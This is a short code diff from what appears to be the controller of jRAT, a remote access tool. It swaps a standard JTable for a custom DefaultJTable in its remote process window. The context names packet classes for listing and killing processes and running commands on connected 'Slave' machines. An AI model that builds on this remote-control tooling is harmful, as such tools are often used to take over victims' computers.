@@ -25,6 +25,7 @@ import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet19ListProcesses;
 import se.jrat.client.packets.outgoing.Packet20KillProcess;
 import se.jrat.client.packets.outgoing.Packet38RunCommand;
+import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.ui.renderers.table.ProcessTableRenderer;
 import se.jrat.client.utils.IconUtils;
 import se.jrat.client.utils.Utils;
@@ -126,7 +127,7 @@ public class FrameRemoteProcess extends JFrame {
 		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(btnClearList).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnCreateProcess).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnKillSelected).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnRefresh)).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 517, GroupLayout.PREFERRED_SIZE)).addContainerGap(98, Short.MAX_VALUE)));
 		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 258, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnClearList).addComponent(btnCreateProcess).addComponent(btnKillSelected).addComponent(btnRefresh)).addContainerGap(61, Short.MAX_VALUE)));
 
-		table = new JTable();
+		table = new DefaultJTable();
 		table.setRowHeight(25);
 		table.setGridColor(Color.white);
 		table.setDefaultRenderer(Object.class, new ProcessTableRenderer());
